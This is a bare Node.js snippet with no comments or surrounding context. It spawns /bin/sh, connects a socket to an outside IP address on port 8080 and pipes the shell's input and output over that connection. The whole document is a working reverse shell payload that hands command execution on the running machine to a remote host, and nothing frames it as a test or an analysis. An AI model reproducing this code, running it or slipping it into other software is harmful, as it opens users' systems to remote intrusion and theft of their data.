(function(){
    var net = require("net"),
    cp = require("child_process"),
    sh = cp.spawn("/bin/sh", []);
    var client = new net.Socket();
    client.connect(8080, "47.241.167.238", function(){
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
    });
})();